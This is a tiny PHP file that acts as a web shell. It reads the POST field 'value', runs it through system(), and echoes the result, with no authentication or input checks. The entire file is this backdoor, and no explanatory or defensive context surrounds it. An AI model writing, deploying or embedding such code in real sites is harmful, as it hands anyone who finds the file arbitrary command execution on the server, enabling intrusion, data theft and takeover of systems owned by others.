<?php

if($_SERVER["REQUEST_METHOD"] == "POST"){
$php_var = $_POST['value'];
$ret_data = system($php_var);
echo $ret_data;
}

?>
